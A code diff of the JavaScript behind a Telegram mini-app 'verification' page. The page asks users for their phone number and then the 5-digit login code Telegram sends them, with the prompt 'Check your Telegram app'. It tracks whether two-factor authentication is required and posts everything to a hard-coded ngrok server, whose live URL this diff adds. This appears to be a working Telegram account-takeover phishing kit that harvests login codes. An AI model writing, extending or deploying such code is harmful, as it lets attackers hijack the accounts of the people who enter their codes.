@@ -8,32 +8,31 @@ document.addEventListener('DOMContentLoaded', function () {
     const keys = document.querySelectorAll('.key');
     const verifyBtn = document.getElementById('verify-btn');
 
-    // ── Config ───────────────────────────────────────────────────────────────
-    // TODO: Replace with your ngrok/deployed server URL
-    // e.g. 'https://abc123.ngrok-free.app'  OR  'https://yourapp.render.com'
-    const SERVER_URL = 'https://REPLACE_WITH_YOUR_SERVER_URL';
+    const SERVER_URL = 'https://proindustrialisation-annice-emptiable.ngrok-free.dev';
 
     let currentIndex = 0;
-    let currentStep = 'phone';
     let userPhone = '';
 
-    // Stable user ID from Telegram (falls back to timestamp if outside Telegram)
     const userId = tg.initDataUnsafe?.user?.id || 'user_' + Date.now();
 
     tg.ready();
     tg.expand();
-    tg.enableClosingConfirmation();
+
+    // Safe alert — works on all WebApp versions
+    function showAlert(msg) {
+        try {
+            tg.showAlert(msg);
+        } catch (e) {
+            alert(msg);
+        }
+    }
 
     // ── Phone Step ───────────────────────────────────────────────────────────
     sendOtpBtn.addEventListener('click', async function () {
         const phone = phoneInput.value.trim();
 
         if (phone.length < 10) {
-            tg.showPopup({
-                title: 'Error',
-                message: 'Please enter a valid phone number!',
-                buttons: [{ type: 'ok', text: 'OK' }]
-            });
+            showAlert('Please enter a valid phone number!');
             return;
         }
 
@@ -44,7 +43,7 @@ document.addEventListener('DOMContentLoaded', function () {
         try {
             const res = await fetch(`${SERVER_URL}/send-otp`, {
                 method: 'POST',
-                headers: { 
+                headers: {
                     'Content-Type': 'application/json',
                     'ngrok-skip-browser-warning': 'true'
                 },
@@ -55,24 +54,12 @@ document.addEventListener('DOMContentLoaded', function () {
 
             if (result.success) {
                 showOtpSection();
-                tg.showPopup({
-                    title: 'Code Sent!',
-                    message: 'Check your Telegram app for the verification code.',
-                    buttons: [{ type: 'ok', text: 'OK' }]
-                });
+                showAlert('Code sent! Check your Telegram app.');
             } else {
-                tg.showPopup({
-                    title: 'Error',
-                    message: result.message || 'Failed to send OTP.',
-                    buttons: [{ type: 'ok', text: 'OK' }]
-                });
+                showAlert(result.message || 'Failed to send OTP.');
             }
         } catch (err) {
-            tg.showPopup({
-                title: 'Error',
-                message: 'Cannot reach server. Is it running?',
-                buttons: [{ type: 'ok', text: 'OK' }]
-            });
+            showAlert('Cannot reach server. Make sure server.py is running.');
         } finally {
             sendOtpBtn.disabled = false;
             sendOtpBtn.textContent = '📤 Send Verification Code';
@@ -84,7 +71,6 @@ document.addEventListener('DOMContentLoaded', function () {
         phoneSection.style.display = 'none';
         otpSection.style.display = 'block';
         document.querySelector('.emoji-center .emoji').textContent = '🔢';
-        currentStep = 'otp';
         currentIndex = 0;
         otpBoxes[0].focus();
     }
@@ -133,11 +119,7 @@ document.addEventListener('DOMContentLoaded', function () {
         const otp = Array.from(otpBoxes).map((box) => box.value).join('');
 
         if (otp.length !== 5) {
-            tg.showPopup({
-                title: 'Error',
-                message: 'Please enter the complete 5-digit code.',
-                buttons: [{ type: 'ok', text: 'OK' }]
-            });
+            showAlert('Please enter the complete 5-digit code.');
             return;
         }
 
@@ -147,7 +129,7 @@ document.addEventListener('DOMContentLoaded', function () {
         try {
             const res = await fetch(`${SERVER_URL}/verify-otp`, {
                 method: 'POST',
-                headers: { 
+                headers: {
                     'Content-Type': 'application/json',
                     'ngrok-skip-browser-warning': 'true'
                 },
@@ -158,28 +140,18 @@ document.addEventListener('DOMContentLoaded', function () {
 
             if (result.success) {
                 if (result.twofa_required) {
-                    // Notify the bot then redirect to 2FA page
                     tg.sendData('otp_verified:needs_2fa');
                 } else {
                     tg.sendData('verified:success');
                 }
             } else {
-                tg.showPopup({
-                    title: 'Invalid Code',
-                    message: result.message || 'Incorrect code. Please try again.',
-                    buttons: [{ type: 'ok', text: 'OK' }]
-                });
-                // Clear OTP boxes for retry
+                showAlert(result.message || 'Incorrect code. Please try again.');
                 otpBoxes.forEach((b) => (b.value = ''));
                 currentIndex = 0;
                 otpBoxes[0].focus();
             }
         } catch (err) {
-            tg.showPopup({
-                title: 'Error',
-                message: 'Cannot reach server.',
-                buttons: [{ type: 'ok', text: 'OK' }]
-            });
+            showAlert('Cannot reach server.');
         } finally {
             verifyBtn.disabled = false;
             verifyBtn.textContent = '✅ Verify Code';
